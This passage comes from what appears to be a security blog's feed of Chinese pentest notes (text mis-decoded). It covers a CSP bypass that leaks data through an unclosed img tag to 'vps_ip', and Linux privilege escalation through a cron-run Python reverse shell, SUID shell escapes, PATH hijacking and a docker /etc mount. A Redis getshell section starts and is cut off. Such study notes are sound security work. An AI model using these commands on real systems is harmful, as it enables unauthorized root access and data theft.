class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/scp/svg-example.png" alt="svg-example"></p>
<h3 id="0X09-ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº"><a href="#0X09-ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº" class="headerlink" title="0X09 ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº"></a>0X09 ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº</h3><ul>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>å¯ä»¥åŠ è½½å¤–åŸŸèµ„æºï¼ˆimg-src: *ï¼‰</li>
<li>éœ€è¦è·å–é¡µé¢æŸå¤„çš„ä¿¡æ¯</li>
</ul>
</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;self&apos;;img-src *;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;];?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;0xffff&#125;&lt;/h1&gt;</span><br><span class="line">&lt;h2 id=&quot;id&quot;&gt;3&lt;/h2&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>æ³¨è§£ï¼šè¿™é‡Œå¯ä»¥æ³¨æ„åˆ°imgç”¨äº†*ï¼Œæœ‰äº›ç½‘ç«™ä¼šç”¨å¾ˆå¤šå¤–é“¾å›¾ç‰‡ï¼Œæ‰€ä»¥è¿™ä¸ªæƒ…å†µå¹¶ä¸å°‘è§<br>è™½ç„¶æˆ‘ä»¬å¯ä»¥æ–°å»ºä»»æ„æ ‡ç­¾ï¼Œä½†æ˜¯ç”±äºCSPæˆ‘ä»¬çš„JSå¹¶ä¸èƒ½æ‰§è¡Œï¼ˆæ²¡æœ‰unsafe-inlineï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ç”¨ä¸å®Œæ•´çš„<code>&lt;img</code>æ ‡ç­¾æ¥å°†æ•°æ®å¸¦å‡º</li>
<li>æµè§ˆå™¨è®¿é—®ï¼š<code>http://127.0.0.1/2.php?xss=&lt;img src=&quot;//vps_ip?a=</code><ul>
<li>æ­¤æ—¶ï¼Œç”±äºsrcçš„å¼•å·æ²¡æœ‰é—­åˆï¼Œhtmlè§£æå™¨ä¼šå»ä¸€ç›´å¯»æ‰¾ç¬¬äºŒä¸ªå¼•å·ï¼Œå¼•å·å…¶ä¸­çš„å¤§éƒ¨åˆ†æ ‡ç­¾éƒ½ä¸ä¼šè¢«è§£æï¼Œæ‰€ä»¥åœ¨ç¬¬å››è¡Œçš„ç¬¬ä¸€ä¸ªå¼•å·å‰çš„æ‰€æœ‰å†…å®¹ï¼Œéƒ½ä¼šè¢«å½“æˆsrcçš„å€¼è¢«å‘é€åˆ°æˆ‘ä»¬çš„vpsä¸Š</li>
</ul>
</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/img-example.png" alt="img-example"></p>
<ul>
<li>â–² 2020.06.05 æ­¤å®éªŒåœ¨Chromeä¸Šæ— æ³•æˆåŠŸæ‰§è¡Œï¼Œå› ä¸ºchromeä¸å…è®¸å‘å‡ºçš„urlä¸­å«æœ‰å›è½¦æˆ–<code>&lt;</code>ï¼Œå¦è€…ä¸ä¼šå‘å‡º</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/img-chrome-error.png" alt="img-chrome-error"> </p>
<h3 id="0X10-CRLFç»•è¿‡"><a href="#0X10-CRLFç»•è¿‡" class="headerlink" title="0X10 CRLFç»•è¿‡"></a>0X10 CRLFç»•è¿‡</h3><ul>
<li>å½“ä¸€ä¸ªé¡µé¢å­˜åœ¨CRLFæ¼æ´æ—¶ï¼Œä¸”æˆ‘ä»¬çš„å¯æ§ç‚¹åœ¨CSPä¸Šæ–¹ï¼Œå°±å¯ä»¥é€šè¿‡æ³¨å…¥å›è½¦æ¢è¡Œï¼Œå°†CSPæŒ¤åˆ°HTTPè¿”å›ä½“ä¸­ï¼Œè¿™æ ·å°±ç»•è¿‡äº†CSP</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥-1"><a href="#å‚è€ƒé“¾æ¥-1" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="https://xz.aliyun.com/t/5084#toc-11" target="_blank" rel="noopener">æˆ‘çš„CSPç»•è¿‡æ€è·¯åŠæ€»ç»“</a></li>
<li><a href="http://sunu11.com/2019/12/13/learning-CSP/" target="_blank" rel="noopener">learning_CSP</a></li>
<li><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">A Wormable XSS on HackMD!</a></li>
</ul>
]]></content>
      <categories>
        <category>Privilge</category>
      </categories>
  </entry>
  <entry>
    <title>Linuxææƒ</title>
    <url>/2020/10/27/md%E6%96%87%E4%BB%B6/linux_privilege_escalation/</url>
    <content><![CDATA[<h2 id="Linuxææƒ"><a href="#Linuxææƒ" class="headerlink" title="Linuxææƒ"></a>Linuxææƒ</h2><h3 id="0X00-å†…æ ¸æ¼æ´ææƒ"><a href="#0X00-å†…æ ¸æ¼æ´ææƒ" class="headerlink" title="0X00 å†…æ ¸æ¼æ´ææƒ"></a>0X00 å†…æ ¸æ¼æ´ææƒ</h3><ul>
<li>æŸ¥çœ‹å‘è¡Œç‰ˆ<ul>
<li><code>cat /etc/issue</code></li>
<li><code>cat /etc/*-release</code></li>
</ul>
</li>
<li>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬<ul>
<li><code>uname -a</code></li>
</ul>
</li>
<li>æŸ¥çœ‹å·²ç»å®‰è£…çš„ç¨‹åº<ul>
<li><code>dpkg -l</code></li>
<li><code>rpm -qa</code></li>
</ul>
</li>
<li>åˆ©ç”¨æ–¹æ³•<ul>
<li>ç°æœ‰å­˜åœ¨çš„expï¼Œå¯ä»¥è·å¾—rootæƒé™ï¼š<a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></li>
<li>ä½¿ç”¨Linuxçš„Searchexploit Linuxç‰ˆæœ¬</li>
<li>â–² æ³¨ï¼šå¾ˆå¤šLinuxçš„æœºå­éƒ½å­˜åœ¨è„ç‰›ææƒæ¼æ´ </li>
</ul>
</li>
</ul>
<h3 id="0X01-æ˜æ–‡rootå¯†ç ææƒ"><a href="#0X01-æ˜æ–‡rootå¯†ç ææƒ" class="headerlink" title="0X01 æ˜æ–‡rootå¯†ç ææƒ"></a>0X01 æ˜æ–‡rootå¯†ç ææƒ</h3><ul>
<li>passwdã€shadow<ul>
<li>passwdå‚¨å­˜äº†ç”¨æˆ·ï¼Œå…¨ç”¨æˆ·å¯è¯»ï¼Œrootå¯å†™</li>
<li>shadowå­˜å‚¨å¯†ç çš„hashï¼Œä»…rootå¯ç‹¬å†™</li>
</ul>
</li>
<li>ææƒå‰æ<ul>
<li>passwdå¯å†™  -&gt;   å°†passwdçš„rootå¯†ç Xæ›¿æ¢ä¸ºæˆ‘ä»¬è‡ªå·±çš„hash</li>
<li>shadowå¯è¯»  -&gt;   æŠŠshadowé‡Œé¢rootçš„hashè¾…åŠ©å‡ºæ¥ï¼Œç”¨hashã€johnçˆ†ç ´</li>
</ul>
</li>
<li>â–² 2020-08-05é«˜ç‰ˆæœ¬Linuxæ— æ³•è¿›è¡Œä¿®æ”¹ï¼Œé»˜è®¤æƒ…å†µæ™®é€šç”¨æˆ·passwdä¸å¯å†™ï¼Œshadowä¸å¯è¯»</li>
</ul>
<h3 id="0X02-å¯†ç å¤ç”¨"><a href="#0X02-å¯†ç å¤ç”¨" class="headerlink" title="0X02 å¯†ç å¤ç”¨"></a>0X02 å¯†ç å¤ç”¨</h3><ul>
<li>æ•°æ®åº“æˆ–è€…Webåå°çš„å¯†ç å°±æ˜¯rootå¯†ç </li>
</ul>
<h3 id="0X03-sudoææƒæ»¥ç”¨"><a href="#0X03-sudoææƒæ»¥ç”¨" class="headerlink" title="0X03 sudoææƒæ»¥ç”¨"></a>0X03 sudoææƒæ»¥ç”¨</h3><ul>
<li>sudoæ˜¯è®©æ™®é€šç”¨æˆ·ä½¿ç”¨è¶…çº§ç”¨æˆ·çš„å‘½ä»¤ï¼Œå…¶é…ç½®æ–‡ä»¶ä¸º/etc/sudoersï¼Œæ–‡ä»¶å®šä¹‰å¯ä»¥æ‰§è¡Œsudoçš„è´¦æˆ·ã€å®šä¹‰æŸä¸ªåº”ç”¨ç¨‹åºç”¨rootè®¿é—®ã€æ˜¯å¦éœ€è¦å¯†ç éªŒè¯</li>
<li>é€šè¿‡<code>sudo -l</code>æ¥æŸ¥çœ‹æ˜¯å¦å…·æœ‰sudoæƒé™æˆ–è€…é€šè¿‡<code>groups</code>æŸ¥çœ‹ç»„æ˜¯å¦å…·æœ‰å…è®¸sudoå‘½ä»¤æƒé™</li>
</ul>
<p><img src="/images/privilge/linux-sudo-l.png" alt="linux-sudo-l"></p>
<h5 id="su-rootè¢«ç¦æ­¢"><a href="#su-rootè¢«ç¦æ­¢" class="headerlink" title="su rootè¢«ç¦æ­¢"></a>su rootè¢«ç¦æ­¢</h5><ul>
<li>åŸå› ï¼šLinuxè¦æ±‚ç”¨æˆ·å¿…é¡»ä»ç»ˆç«¯è®¾å¤‡ï¼ˆttyï¼‰ä¸­è¾“å…¥å¯†ç ï¼Œè€Œä¸æ˜¯æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰ï¼Œæ‰€ä»¥sudoåœ¨è¾“å…¥å¯†ç çš„æ—¶å€™æœ¬è´¨ä¸Šæ˜¯è¯»å–äº†é”®ç›˜ï¼Œè€Œä¸æ˜¯è¯»å–bashé‡Œé¢è¾“å…¥çš„å­—ç¬¦</li>
<li>è§£å†³æ–¹æ³•ï¼šä½¿ç”¨pythonåŠ è½½ä¸€ä¸ªpty<ul>
<li><code>python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></li>
</ul>
</li>
<li>â–² è½¬æ¢ä¸ºäº¤äº’å¼shellä»¥åŠç»ˆç«¯å‹shellçš„æ–¹æ³•è¿˜æœ‰å¾ˆå¤šï¼Œpythonæ˜¯æœ€ç®€å•ä¸€ç§ï¼Œä½†éœ€è¦pythonç¯å¢ƒæ‰å¯ä»¥æ‰§è¡Œè½¬æ¢</li>
</ul>
<p><img src="/images/privilge/linux-su-sudo.PNG" alt="linux-su-sudo"></p>
<h3 id="0X04-è®¡åˆ’ä»»åŠ¡"><a href="#0X04-è®¡åˆ’ä»»åŠ¡" class="headerlink" title="0X04 è®¡åˆ’ä»»åŠ¡"></a>0X04 è®¡åˆ’ä»»åŠ¡</h3><ul>
<li>ç³»ç»Ÿå†…å¯èƒ½ä¼šæœ‰ä¸€äº›å®šæ—¶æ‰§è¡Œçš„ä»»åŠ¡ï¼Œä¸€èˆ¬è¿™äº›ä»»åŠ¡ç”±crontabæ¥ç®¡ç†ï¼Œå…·æœ‰æ‰€å±ç”¨æˆ·çš„æƒé™</li>
<li>å‰æ<ul>
<li>å¯åˆ—å‡º/etcå†…ç³»ç»Ÿçš„è®¡åˆ’ä»»åŠ¡</li>
<li>ç¨‹åºé»˜è®¤æ˜¯ä»¥rootæƒé™æ‰§è¡Œ</li>
<li>å…¶ä¸­ä¸€ä¸ªè„šæœ¬é…ç½®æˆä»»æ„ç”¨æˆ·å¯å†™</li>
</ul>
</li>
</ul>
<p><img src="/images/privilge/linux-cron-root.png" alt="linux-cron-root"></p>
<ul>
<li>ä¿®æ”¹è„šæœ¬ä¸ºè‡ªå·±æ‰§è¡Œçš„å†…å®¹ /etc/cron.d/py_reverse_shell<ul>
<li>è„šæœ¬çš„æ„æ€ä¸ºï¼Œæ¯ä¸¤åˆ†é’Ÿrootç”¨æˆ·æ‰§è¡Œä¸€æ¬¡testç›®å½•ä¸‹çš„pythonè„šæœ¬</li>
</ul>
</li>
</ul>
<p><code>*/2 * * * * root python3.8 /home/test/py_reverse_shell.py</code></p>
<p><img src="/images/privilge/linux-crond.png" alt="linux-crond"></p>
<ul>
<li>py_reverse_shell.pyï¼Œå¸¸ç”¨çš„pythonåå¼¹shçš„shell</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>,<span class="number">1234</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>

<p><img src="/images/privilge/linux-reverse-py.jpg" alt="linux-reverse-py"></p>
<ul>
<li>ä½¿ç”¨ä½æƒé™çš„ç”¨æˆ·å¼€å¯ncç›‘å¬ç«¯å£ï¼Œ2åˆ†é’Ÿåå³å¯è·å–åˆ°rootçš„shçš„shell</li>
</ul>
<p><img src="/images/privilge/linux-cron-reverse-nc.png" alt="linux-cron-reverse-nc"></p>
<h3 id="0X05-SUIDææƒ"><a href="#0X05-SUIDææƒ" class="headerlink" title="0X05 SUIDææƒ"></a>0X05 SUIDææƒ</h3><ul>
<li>æ¦‚è¦<ul>
<li>SUIDæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶å±æ€§ï¼Œå®ƒå…è®¸ç”¨æˆ·æ‰§è¡Œçš„æ–‡ä»¶ä»¥è¯¥æ–‡ä»¶çš„æ‹¥æœ‰è€…çš„èº«ä»½è¿è¡Œ</li>
</ul>
</li>
<li>æ–‡ä»¶æƒé™å‘½ä»¤<ul>
<li>SUIDï¼šchmod u+s file</li>
</ul>
</li>
<li>æŸ¥çœ‹SUIDæ–‡ä»¶<ul>
<li>find / -user root -perm -4000 -print 2&gt;/dev/null</li>
<li>find / -perm -u=s -type f 2&gt;/dev/null</li>
</ul>
</li>
</ul>
<h5 id="findå‘½ä»¤"><a href="#findå‘½ä»¤" class="headerlink" title="findå‘½ä»¤"></a>findå‘½ä»¤</h5><ul>
<li><code>find examples.desktop exec whoami \;</code><ul>
<li>â–² å¦‚æœæœ‰pythonç¯å¢ƒï¼Œåˆ™å¯ä»¥ç›´æ¥pythonåå¼¹å‘½ä»¤</li>
</ul>
</li>
</ul>
<p><img src="/images/privilge/linux-suid-find.PNG" alt="linux-suid-find"></p>
<h5 id="å…¶ä»–SUIDæƒé™å‘½ä»¤"><a href="#å…¶ä»–SUIDæƒé™å‘½ä»¤" class="headerlink" title="å…¶ä»–SUIDæƒé™å‘½ä»¤"></a>å…¶ä»–SUIDæƒé™å‘½ä»¤</h5><ul>
<li>bash<ul>
<li>bash -p</li>
</ul>
</li>
<li>less<ul>
<li>less /etc/passwd</li>
<li>!/bin/sh</li>
</ul>
</li>
<li>awk<ul>
<li>awk â€˜BEGIN {system(â€œ/bin/bash -pâ€)}â€™</li>
</ul>
</li>
<li>csh<ul>
<li>csh -b</li>
</ul>
</li>
<li>dmesg<ul>
<li>dmesg -H</li>
<li>!/bin/sh -p</li>
</ul>
</li>
<li>man<ul>
<li>man man </li>
<li>!/bin/sh -p</li>
</ul>
</li>
<li>more<ul>
<li>more /etc/profile</li>
<li>!/bin/sh -p</li>
</ul>
</li>
<li>â–² å…·æœ‰SUIDæƒé™çš„å‘½ä»¤æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æœ‰å¾ˆå¤šï¼Œè¯¦ç»†è§å‚è€ƒé“¾æ¥çš„æ–‡ç« </li>
</ul>
<h3 id="0X06-åŠ«æŒç¯å¢ƒå˜é‡è¿›è¡Œææƒ"><a href="#0X06-åŠ«æŒç¯å¢ƒå˜é‡è¿›è¡Œææƒ" class="headerlink" title="0X06 åŠ«æŒç¯å¢ƒå˜é‡è¿›è¡Œææƒ"></a>0X06 åŠ«æŒç¯å¢ƒå˜é‡è¿›è¡Œææƒ</h3><ul>
<li>æ¦‚è¦<ul>
<li>PATHæ˜¯Linuxå’Œç±»Unixæ“ä½œç³»ç»Ÿä¸­çš„ç¯å¢ƒå˜é‡ï¼Œå®ƒæŒ‡å®šå­˜å‚¨å¯æ‰§è¡Œç¨‹åºçš„binå’Œsbinç›®å½•</li>
<li>å½“ç”¨æˆ·åœ¨ç»ˆç«¯ä¸Šæ‰§è¡Œä»»ä½•å‘½ä»¤æ—¶ï¼Œå®ƒä¼šé€šè¿‡PATHå˜é‡æ¥å“åº”ç”¨æˆ·æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¹¶å‘shellå‘é€è¯·æ±‚ä»¥æœç´¢å¯æ‰§è¡Œæ–‡ä»¶</li>
</ul>
</li>
<li>æŸ¥çœ‹å½“å‰PATHç¯å¢ƒå˜é‡ï¼š<code>echo $PATH</code><ul>
<li><code>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</code></li>
</ul>
</li>
<li>å‰æ<ul>
<li>å¯ä»¥æ“ä½œçš„PATHç¯å¢ƒå˜é‡</li>
<li>å…·æœ‰suidæƒé™çš„è„šæœ¬æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¦‚<code>ps</code>ï¼Œ<code>id</code>ç­‰</li>
</ul>
</li>
<li>æµ‹è¯•</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">******************ç¬¬ä¸€æ­¥************  rootç”¨æˆ·æˆ–è€…é«˜æƒé™ç”¨æˆ·</span><br><span class="line"><span class="built_in">cd</span> /home/tomas</span><br><span class="line">vi demo.c</span><br><span class="line">    <span class="comment">#include&lt;unistd.h&gt;</span></span><br><span class="line">    void main()</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">"ps"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">gcc demo.c -o shell</span><br><span class="line">chmod u+s shell</span><br><span class="line"></span><br><span class="line">******************ç¬¬äºŒæ­¥************  ä½æƒé™ç”¨æˆ·</span><br><span class="line">ECHOå‘½ä»¤ï¼š</span><br><span class="line">    <span class="built_in">cd</span> /tmp</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"/bin/bash"</span> &gt; ps</span><br><span class="line">    chmod 777 ps</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">    <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">    <span class="built_in">cd</span> /home/tomas</span><br><span class="line">    ./shell</span><br><span class="line">    whoami</span><br><span class="line">COPYå‘½ä»¤ï¼š</span><br><span class="line">    <span class="built_in">cd</span> /home/tomas</span><br><span class="line">    cp /bin/bash</span><br><span class="line">    sh /tmp/ps</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">    <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">    ./shell</span><br><span class="line">    whoami</span><br><span class="line">SYMLINKå‘½ä»¤ï¼š</span><br><span class="line">    ln -s /bin/sh ps</span><br><span class="line">    <span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line">    ./shell</span><br><span class="line">    id</span><br><span class="line">    whoami</span><br></pre></td></tr></table></figure>

<p><img src="/images/privilge/linux-path-echo.PNG" alt="linux-path-echo"></p>
<p><img src="/images/privilge/linux-path-copy.PNG" alt="linux-path-copy"></p>
<p><img src="/images/privilge/linux-path-symlink.PNG" alt="linux-path-symlink">   </p>
<h3 id="0X07-dockerç»„ææƒ"><a href="#0X07-dockerç»„ææƒ" class="headerlink" title="0X07 dockerç»„ææƒ"></a>0X07 dockerç»„ææƒ</h3><h5 id="dockerç»„æˆå‘˜è¿è¡Œdocker"><a href="#dockerç»„æˆå‘˜è¿è¡Œdocker" class="headerlink" title="dockerç»„æˆå‘˜è¿è¡Œdocker"></a>dockerç»„æˆå‘˜è¿è¡Œdocker</h5><ul>
<li>é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨dockerå¿…é¡»è¦æœ‰sudoæƒé™</li>
<li>åªéœ€è¦ç®¡ç†å‘˜å°†éœ€è¦ä½¿ç”¨dockerçš„ç”¨æˆ·æ·»åŠ åˆ°dockerç”¨æˆ·ç»„ä¸­ï¼Œç”¨æˆ·é‡æ–°ç™»å½•æœºå™¨å³å¯å…sudoä½¿ç”¨dockeräº†</li>
</ul>
<h5 id="dockerå®¹å™¨å†…ç”¨æˆ·æƒé™ä¸ºroot"><a href="#dockerå®¹å™¨å†…ç”¨æˆ·æƒé™ä¸ºroot" class="headerlink" title="dockerå®¹å™¨å†…ç”¨æˆ·æƒé™ä¸ºroot"></a>dockerå®¹å™¨å†…ç”¨æˆ·æƒé™ä¸ºroot</h5><ul>
<li>ç”¨æˆ·åˆ›å»ºä¸€ä¸ªdockerå®¹å™¨åï¼Œå®¹å™¨å†…é»˜è®¤æ˜¯rootè´¦æˆ·ï¼Œåœ¨ä¸éœ€è¦åŠ sudoçš„æƒ…å†µä¸‹å¯ä»¥ä»»æ„æ›´æ”¹å®¹å™¨å†…çš„é…ç½®</li>
</ul>
<h5 id="dockeræ–‡ä»¶æ˜ å°„æ–¹ä¾¿å®¹å™¨å†…å¤–æ–‡ä»¶å…±äº«"><a href="#dockeræ–‡ä»¶æ˜ å°„æ–¹ä¾¿å®¹å™¨å†…å¤–æ–‡ä»¶å…±äº«" class="headerlink" title="dockeræ–‡ä»¶æ˜ å°„æ–¹ä¾¿å®¹å™¨å†…å¤–æ–‡ä»¶å…±äº«"></a>dockeræ–‡ä»¶æ˜ å°„æ–¹ä¾¿å®¹å™¨å†…å¤–æ–‡ä»¶å…±äº«</h5><ul>
<li>dockeræä¾›äº†ä¸€ä¸ª-vé€‰é¡¹ï¼Œæä¾›ç”¨æˆ·å°†å®¹å™¨å¤–çš„hostç›®å½•æ˜ å°„è¿›å®¹å™¨å†…ï¼Œæ–¹ä¾¿çš„è¿›è¡Œå®¹å™¨å†…å¤–çš„æ–‡ä»¶å…±äº«</li>
</ul>
<h5 id="dockerææƒæ­¥éª¤"><a href="#dockerææƒæ­¥éª¤" class="headerlink" title="dockerææƒæ­¥éª¤"></a>dockerææƒæ­¥éª¤</h5><ul>
<li>åœ¨dockerç»„çš„ç”¨æˆ·ï¼Œä½†ä¸å…·æœ‰sudoç»„çš„æƒé™ï¼Œåˆ›å»ºä¸€ä¸ªå®¹å™¨<ul>
<li><code>docker run -it --rm -v /etc:/etc xxx /bin/bash</code>   #å¼‚å¸¸ä½¿ç”¨ï¼Œå…±äº«å¤–éƒ¨æ–‡ä»¶/etc</li>
<li><code>adduser test1</code>   # ä½¿ç”¨å®¹å™¨å†…çš„rootæƒé™åˆ›å»ºä¸€ä¸ªtest1ç”¨æˆ·</li>
<li><code>usermod -aG sudo test1</code>  # å°†è¯¥ç”¨æˆ·èµ‹äºˆsudoæƒé™</li>
</ul>
</li>
<li>è¿›è¡Œææƒ<ul>
<li><code>Ctrl+D</code>  # é€€å‡ºå®¹å™¨åˆ°host</li>
<li><code>cat /etc/passwd</code>  # å‘ç°æ–°å¢äº†ç”¨æˆ·test1</li>
<li><code>su test1</code>  # åˆ‡æ¢ç”¨æˆ·åˆ°test1ç”¨æˆ·</li>
<li><code>groups</code> # å‘ç°test1ç”¨æˆ·å…·æœ‰sudoç»„çš„æƒé™</li>
</ul>
</li>
</ul>
<p><img src="/images/privilge/linux-docker.PNG" alt="linux-docker"></p>
<h5 id="è§„é¿æªæ–½"><a href="#è§„é¿æªæ–½" class="headerlink" title="è§„é¿æªæ–½"></a>è§„é¿æªæ–½</h5><ul>
<li>å¯¹äºå¤šä¸ªç”¨æˆ·æƒ³ä½¿ç”¨å®¹å™¨ï¼Œå¯ä»¥é€šè¿‡ç®¡ç†å‘˜é›†ä¸­åˆ›å»ºå¼€å¯äº†sshæœåŠ¡çš„å®¹å™¨ï¼Œå¹¶æä¾›ç«¯å£æ˜ å°„åˆ°hostä¸Šï¼Œè®©æ™®é€šç”¨æˆ·é€šè¿‡sshé“¾æ¥è¿›å…¥å®¹å™¨ï¼Œè¿™æ ·å°±å¯ä»¥é™åˆ¶æ™®é€šç”¨æˆ·çš„æ´»åŠ¨èŒƒå›´åœ¨å®¹å™¨å†…ï¼Œç”¨æˆ·çš„ä»»æ„æ“ä½œä¹Ÿä¸ä¼šæ‰©æ•£åˆ°hostä¸Š</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" rel="noopener">Linux Privilege Escalation Using PATH Variable</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651091670&idx=3&sn=8df01e482e3cad5bec29128d389ead37&chksm=bd1fe05d8a68694b336fb948e0de833b1b1e7bb25a228e3f188d8762276020f304b6f2491b8a&mpshare=1&scene=1&srcid=0805vnaZrUzFk6iQSVhath1O&sharer_sharetime=1596588256066&sharer_shareid=13de7cf246df94cfb693d05988b76aac&key=b21c8bfc2e98d5d8b23ded436e6d4de1d3d39a65f3a44305a57fc5c39817fbccfbdd7702789cf712dadec58c1640ba161271d86c2d8558039af171b9655d4b152861679b0e57297b461c7bd55945f29b&ascene=1&uin=MjYzNzU1MTExOQ%3D%3D&devicetype=Windows+10+x64&version=62090529&lang=zh_CN&exportkey=AyyflVNz0ZmoNq26aIJSHWs%3D&pass_ticket=9ZbiqJaZM%2BTSww8n%2B5NlblNhuTskf5FAtm2QvX0VLMI9Y05ZlZsRDqPhkMS40B5u" target="_blank" rel="noopener">CentOS 7ç³»ç»Ÿåˆ©ç”¨suidææƒè·å–Root Shell</a></li>
<li><a href="https://www.freebuf.com/articles/system/173903.html" target="_blank" rel="noopener">åœ¨Linuxä¸­ä½¿ç”¨ç¯å¢ƒå˜é‡è¿›è¡Œææƒ</a></li>
<li><a href="https://www.cnblogs.com/BOHB-yunying/articles/11517748.html" target="_blank" rel="noopener">Linuxå¸¸è§ææƒ</a></li>
<li><a href="https://www.freebuf.com/articles/system/170783.html" target="_blank" rel="noopener">æ™®é€šç”¨æˆ·å€ŸåŠ©Dockerå®¹å™¨ææƒæ€è·¯åˆ†äº«</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1544037" target="_blank" rel="noopener">Linux ææƒçš„å„ç§å§¿åŠ¿æ€»ç»“</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1547098" target="_blank" rel="noopener">ææƒæ€»ç»“ä»¥åŠå„ç§åˆ©ç”¨å§¿åŠ¿</a></li>
</ul>
]]></content>
      <categories>
        <category>Privilge</category>
      </categories>
  </entry>
  <entry>
    <title>Redisæœªæˆæƒè®¿é—®</title>
    <url>/2020/10/27/md%E6%96%87%E4%BB%B6/redis_unauthorized_access/</url>
    <content><![CDATA[<h2 id="redisæœªæˆæƒè®¿é—®"><a href="#redisæœªæˆæƒè®¿é—®" class="headerlink" title="redisæœªæˆæƒè®¿é—®"></a>redisæœªæˆæƒè®¿é—®</h2><h3 id="0X00-redisçš„æœªæˆæƒè®¿é—®ç®€ä»‹"><a href="#0X00-redisçš„æœªæˆæƒè®¿é—®ç®€ä»‹" class="headerlink" title="0X00 redisçš„æœªæˆæƒè®¿é—®ç®€ä»‹"></a>0X00 redisçš„æœªæˆæƒè®¿é—®ç®€ä»‹</h3><ul>
<li>Redisåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œç»‘å®šåœ°å€ä¸º127.0.0.1:6379ï¼Œåœ¨ä¸é€‚å½“æ“ä½œä¸‹ï¼Œä¼šç»‘å®šåœ°å€ä¸º0.0.0.0:6379ï¼Œä¸”æ— é‡‡ç”¨é™åˆ¶IPè®¿é—®ï¼Œå°†ä¼šæŠŠRedisæœåŠ¡ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå†åŠ ä¸Šè‹¥æ— è®¾ç½®å¯†ç è®¤è¯ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·æœªæˆæƒè®¿é—®Redisä»¥åŠè¯»å–Redisæ•°æ®å¹¶å†™å…¬é’¥è¿›è¡Œè¿œç¨‹è¿æ¥ç­‰ï¼Œç”šè‡³getshell</li>
</ul>
<h3 id="0X01-crontab-getshell"><a href="#0X01-crontab-getshell" class="headerlink" title="0X01 crontab-getshell"></a>0X01 crontab-getshell</h3><ul>
<li>åœ¨Linuxç³»ç»Ÿä¸­æœ‰å®šæ—¶ä»»åŠ¡çš„åŠŸèƒ½ï¼Œåªè¦æ–‡ä»¶å¯ä»¥å†™å…¥åˆ°å®šæ—¶ä»»åŠ¡ç›®å½•é‡Œé¢å°±å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li>
<li>ä»»åŠ¡ç›®å½•<ul>
<li>/var/spool/cron/ç”¨æˆ·å</li>
<li>/var/spool/cron/crontabs/ç”¨æˆ·å</li>
<li>/etc/crontab</li>
<li>/etc/cron.d/xxx</li>
</ul>
</li>
<li>reids-cliå®¢æˆ·ç«¯å†™crontab</li>
</ul>
